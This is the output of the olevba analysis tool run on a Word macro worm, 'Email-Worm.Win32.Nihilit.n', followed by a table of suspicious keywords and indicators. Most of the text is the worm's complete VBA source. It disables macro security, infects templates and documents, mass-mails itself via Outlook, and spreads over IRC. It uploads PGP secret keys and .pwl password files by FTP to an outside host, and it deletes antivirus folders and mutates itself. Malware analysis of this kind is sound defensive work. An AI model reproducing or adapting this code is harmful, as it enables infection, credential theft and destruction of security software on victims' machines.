olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Email-Worm.Win32.Nihilit.n
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Email-Worm.Win32.Nihilit.n - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoOpen()
If MacroContainer <> "Normal.dot" Then Call Cryptme
End Sub

Sub AutoClose()
    On Error Resume Next
Randomize
sv = Int(Rnd * 3) + 1
If sv = 1 Then svt$ = "porno.doc"
If sv = 3 Then svt$ = "readme!.doc"
If sv = 2 Then svt$ = "sex.doc"
Call Nihilit

If MacroContainer <> "Normal.dot" Then Call Cryptme
If Left(ActiveDocument.Name, 8) <> "Document" And ActiveDocument.Saved = False Then ActiveDocument.Save
Call KillAV

z = Application.System.PrivateProfileString("", _
"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" & _
"\CurrentVersion\App Paths\winzip32.exe", "")
w = Environ("windir")
VBA.Shell z & " -a -r " & w & "\Nihilit.zip" _
& Chr(32) & w & "\nihilit.doc", vbHide
End Sub

Sub Nihilit()
    On Error Resume Next
'thanks to jackie for some advanced code...
    Word.Application.Options.VirusProtection = n
    Word.Application.Options.ConfirmConversions = n
    Word.Application.Options.SaveNormalPrompt = n
    Application.DisplayAlerts = wdAlertsNone
    
Select Case Application.Version
Case "10.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
    CommandBars("Macro").Controls("Security...").Enabled = False
Case "9.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    CommandBars("Macro").Controls("Security...").Enabled = False
End Select
WordBasic.DisableAutoMacros 0
Application.DisplayStatusBar = False
ActiveDocument.ReadOnlyRecommended = False
If GetAttr(ActiveDocument.FullName) = 1 Then
SetAttr ActiveDocument.FullName, 0
ActiveDocument.Reload
End If
Set Nor = NormalTemplate.VBProject.VBComponents
Set Doc = ActiveDocument.VBProject.VBComponents
DropFile = "C:\Windows\Nihilit.sys"
If Nor.Item("Nihilit").Name <> "Nihilit" Then
    Doc("Nihilit").Export DropFile
    Nor.Import DropFile
End If
If Doc.Item("Nihilit").Name <> "Nihilit" Then
    Nor("Nihilit").Export DropFile
    Doc.Import DropFile
    ActiveDocument.Save
End If
SetAttr ActiveDocument.FullName, 1
Call Pgp
Call polyme
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Nihilit") = "C:\Windows\Backup.vbs"
Open "C:\Windows\Backup.vbs" For Output As #1
Print #1, "rem VBS.Backup for Nihilit Virus by Necronomikon"
Print #1, "On Error Resume Next"
Print #1, "Dim WSHShell"
Print #1, "Set WSHShell = WScript.CreateObject(""WScript.Shell"")"
Print #1, "WSHShell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\AccessVBOM"", 1, ""REG_DWORD"""
Print #1, "WSHShell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\Level"", 1, ""REG_DWORD"""
Print #1, "WSHShell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\Level"", 1, ""REG_DWORD"""
Print #1, "Set Backup = WScript.CreateObject(""Word.Application"")"
Print #1, "Backup.Options.VirusProtection = (Rnd * 0)"
Print #1, "Backup.Options.SaveNormalPrompt = (Rnd * 0)"
Print #1, "Backup.NormalTemplate.VBProject.VBComponents.Remove Backup.NormalTemplate.VBProject.VBComponents(""Nihilit"")"
Print #1, "Backup.NormalTemplate.Save"
Print #1, "Backup.NormalTemplate.VBProject.VBComponents.Import (""C:\Windows\Nihilit.sys"")"
Print #1, "Set Search = Backup.Application.Filesearch"
Print #1, "Search.LookIn = ""C:\"": Search.SearchSubFolders = True: Search.FileName = ""*.doc"": Search.Execute"
Print #1, "For f = 1 To Search.FoundFiles.Count"
Print #1, "Victim = Search.FoundFiles(f)"
Print #1, "Backup.Documents.Open Victim"
Print #1, "Backup.ActiveDocument.VBProject.VBComponents.Remove Backup.ActiveDocument.VBProject.VBComponents("" & VirusName & "")"
Print #1, "Backup.ActiveDocument.VBProject.VBComponents.Import (""C:\Windows\Nihilit.sys"")"
Print #1, "Backup.ActiveDocument.Save"
Print #1, "Backup.ActiveDocument.Close"
Print #1, "Next"
Print #1, "Backup.Application.Quit"
Close #1
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Necronomikon\Nihilit", "Irc") = "True"
    Call vIRC
If Day(Now) = Minute(Now) Then Selection.TypeText " You are Infected with Nihilit by Necronomikon/ZeroGravity"
    ActiveDocument.SaveAs FileName:="C:\Windows\Nihilit.doc", FileFormat:=wdFormatDocument
    Set Ni_OApp = CreateObject("Outlook.Application")
    Set Ni_Mapi = Ni_OApp.GetNameSpace("MAPI")
    For Each Ni_AddList In Ni_Mapi.AddressLists
    Next
    If Ni_AddList.AddressEntries.Count <> 0 Then
    For Ni_AddListCount = 1 To Ni_AddList.AddressEntries.Count
    Next
    Set Ni_AddListEntry = Ni_AddList.AddressEntries(Ni_AddListCount)
    Set Ni_msg = Ni_OApp.CreateItem(0)
    Ni_msg.To = Ni_AddListEntry.Address
    Ni_msg.Subject = "Check this!!!"
    Ni_msg.Body = "I like this story!!!;o)." + vbCrLf + "Nihilit"
    Ni_msg.Attachments.Add Environ("WINDIR") & "\Nihilit.doc"
    Ni_msg.DeleteAfterSubmit = True
    If Ni_msg.To <> "" Then
    Ni_msg.Send
    End If
    End If
  End Sub

Sub Pgp()
On Error Resume Next
'taken from W97M/Caligula Virus by Opic/CodeBreakers
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Nihilit") = False) Then
pgppath = System.PrivateProfileString("", "HKEY_CLASSES_ROOT\PGP Encrypted File\shell\open\command", "")
Position = InStr(1, pgppath, "pgpt")

If Position <> 0 Then
pgppath = Mid(pgppath, 1, Position - 2)
Else
GoTo noPGP
End If

With Application.FileSearch
    .FileName = "\Secring.skr"
    .LookIn = pgppath
    .SearchSubFolders = True
    .MatchTextExactly = True
    .FileType = msoFileTypeAllFiles
    .Execute
    PGP_Sec_Key = .FoundFiles(1)
End With

Randomize
  For i = 1 To 4
    NewSecRingFile = NewSecRingFile + Mid(Str(Int(8 * Rnd)), 2, 1)
  Next i
  NewSecRingFile = "./secring" & NewSecRingFile & ".skr"

Open "c:\sys.vxd" For Output As #1
    Print #1, "ftp http://members.tripod.com/Nihilit/"
    Print #1, "user nihilit"
    Print #1, "pass killer"
    Print #1, "cd incoming"
    Print #1, "binary"
    Print #1, "put """ & PGP_Sec_Key & """ """ & NewSecRingFile & """"
    Print #1, "quit"
    Close #1

Shell "command.com /c ftp.exe -n -s:c:\sys.vxd", vbHide

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Nihilit") = True

End If

noPGP:
MsgBox "No PGP found on ya system!?", 64, "Eeeekkkk...."
Call Pwdstealer
End Sub


Sub Pwdstealer()
    On Error Resume Next
    With Application.FileSearch
.FileName = "*.pwl"
.LookIn = "c:"
.Execute
For i = 1 To .FoundFiles.Count
Shell "ftp http://members.tripod.com/Nihilit/", vbHide
Shell "nihilit", vbHide
Shell "killer", vbHide
Shell "post" & .FoundFiles(i), vbHide
Shell "bye", vbHide
Next i
End With
End Sub

'---- from NTVCK by me!;p -----
Sub KillAV()
On Error Resume Next
Kill "C:\Progra~1\AntiViral Toolkit Pro\*.*"
Kill "C:\Progra~1\Command Software\F-PROT95\*.*"
Kill "C:\Progra~1\FindVirus\*.*"
Kill "C:\Toolkit\FindVirus\*.*"
Kill "C:\Progra~1\Quick Heal\*.*"
Kill "C:\Progra~1\McAfee\VirusScan95\*.*"
Kill "C:\Progra~1\Norton AntiVirus\*.*"
Kill "C:\TBAVW95\*.*"
Kill "C:\VS95\*.*"
Kill "C:\eSafe\Protect\*.*"
Kill "C:\PC-Cillin 95\*.*"
Kill "C:\PC-Cillin 97\*.*"
Kill "C:\f-macro\*.*"
Kill "C:\Progra~1\FWIN32"
End Sub

Sub polyme()
On Error Resume Next
'Ultras Macro Polymorph
PoNu = Int(Rnd() * 28 + 1)
For Mutate = 1 To PoNu
PoRL = Application.VBE.ActiveVBProject.VBComponents("nihilit").CodeModule.CountOfLines
PoLi = Int(Rnd() * PoRL + 1)
A = Rnd * 455: b = Rnd * 80: c = Rnd * 160: d = Rnd * 180: e = Rnd * 49
Application.VBE.ActiveVBProject.VBComponents("nihilit").CodeModule.InsertLines PoLi, vbTab & "Rem " & A & vbTab & b & vbTab & c & vbTab & d & vbTab & e
Next Mutate
End Sub

Sub Cryptme()
On Error GoTo out
Selection.WholeStory
A$ = Selection
For a_ = 1 To Len(A$) Step 2
b$ = b$ + Mid(A$, a_ + 1, 1)
b$ = b$ + Mid(A$, a_, 1)
Next
Selection.TypeText Text:=b$
Selection.Range.Delete
Selection.HomeKey Unit:=wdStory, Extend:=wdMove
out:
End Sub


Sub vIRC()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Necronomikon\Nihilit", "Irc") <> "True" Then
End If
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\MeGALiTH Software\Visual IRC96\Events", "Event17") = "dcc send $nick C:\Windows\Nihilit.zip"
End Sub

Sub ToolsOptions()
    On Error Resume Next
    Options.VirusProtection = 1
    Options.SaveNormalPrompt = 1
    Dialogs(wdDialogToolsOptions).Show
    Options.VirusProtection = 0
    Options.SaveNormalPrompt = 0
End Sub

Sub ToolsSecurity()
On Error Resume Next
CommandBars("Macro").Controls("Security...").Enabled = True
Dialogs(wdDialogToolsSecurity).Show
CommandBars("Macro").Controls("Security...").Enabled = False
Call polyme
End Sub

Sub FileTemplates()
On Error Resume Next
Call polyme
End Sub

Sub ToolsMacro()
On Error Resume Next
    Call Stealth
    Dialogs(wdDialogToolsMacro).Display
Call polyme
End Sub

Sub ViewVBCode()
On Error Resume Next
    Call Stealth
    ShowVisualBasicEditor = True
Call polyme
End Sub

Sub Stealth()
    On Error Resume Next
    Application.OrganizerDelete Source:=NormalTemplate.Name, _
    Name:="Nihilit", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerDelete Source:=ActiveDocument.Name, _
    Name:="Nihilit", Object:=wdOrganizerObjectProjectItems
    NormalTemplate.Saved = True
    ActiveDocument.Saved = True
End Sub

Sub HelpAbout()
On Error Resume Next
WordBasic.FileNew
    WordBasic.ToggleFull
    WordBasic.DocMaximize
    WordBasic.Font "Comic Sans MS"
    WordBasic.FontSize 60
    WordBasic.Bold
    WordBasic.Insert "Check this!"
    WordBasic.StartOfLine
    WordBasic.CharRight 1, 1
    WordBasic.FormatFont Points:="48", Color:=6
    WordBasic.EndOfLine
    WordBasic.InsertPara
    WordBasic.InsertPara
    WordBasic.FontSize 48
    WordBasic.Insert "Nihilit was coded by Necronomikon."
End Sub

Sub FileExit()
    On Error Resume Next
    Call Nihilit
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Nihilit
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Nihilit
End If
Loop
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "h:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "f:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
    Application.Quit
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Nihilit
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Nihilit
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Nihilit
End If
Loop
    If ActiveDocument.Saved = False Then ActiveDocument.Save
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "r:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "s:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://members.tripo|URL                                          |
|          |d.com/Nihilit/      |                                             |
|IOC       |winzip32.exe        |Executable file name                         |
|IOC       |Backup.vbs          |Executable file name                         |
|IOC       |ftp.exe             |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

